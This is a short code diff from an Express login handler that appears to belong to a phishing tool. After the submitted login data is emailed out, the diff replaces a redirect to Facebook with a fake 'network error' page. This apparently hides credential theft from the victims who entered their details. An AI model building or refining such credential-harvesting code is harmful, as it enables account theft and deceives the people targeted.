@@ -37,7 +37,7 @@ app.post('/login', async(req, res) => {
         const info=await transport.sendMail(data);
         if(info){
             console.log("email sent !");
-            return res.redirect('https://www.facebook.com')
+            return res.send('<h1>network error</h1>')
         }
       }catch(err){
         console.log(err)
